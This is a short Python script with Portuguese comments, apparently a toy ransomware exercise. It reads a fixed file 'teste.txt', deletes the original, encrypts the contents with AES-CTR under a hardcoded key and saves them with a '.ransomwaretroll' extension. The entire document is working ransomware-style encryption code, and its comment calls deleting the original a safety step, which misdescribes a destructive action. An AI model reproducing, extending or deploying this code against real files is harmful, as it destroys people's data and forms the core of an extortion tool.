# Importa os módulos necessários
import os         # Módulo para manipulação de arquivos e sistema operacional
import pyaes      # Biblioteca para criptografia/descriptografia AES

# Etapa 1: Abrir o arquivo a ser criptografado
file_name = "teste.txt"            # Nome do arquivo que será criptografado
file = open(file_name, "rb")       # Abre o arquivo no modo de leitura binária
file_data = file.read()            # Lê o conteúdo do arquivo e armazena em file_data
file.close()                       # Fecha o arquivo após a leitura

# Etapa 2: Remover o arquivo original
os.remove(file_name)               # Exclui o arquivo original para segurança

# Etapa 3: Configurar a chave de criptografia
key = b"testeransomwares"          # Define a chave AES usada para criptografia
aes = pyaes.AESModeOfOperationCTR(key)  # Configura o AES no modo CTR com a chave

# Etapa 4: Criptografar os dados do arquivo
crypto_data = aes.encrypt(file_data)  # Criptografa os dados lidos do arquivo original

# Etapa 5: Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"  # Define o nome do novo arquivo criptografado
new_file = open(f'{new_file}', 'wb')      # Abre (ou cria) o arquivo no modo de escrita binária
new_file.write(crypto_data)               # Escreve os dados criptografados no novo arquivo
new_file.close()                          # Fecha o arquivo após a escrita
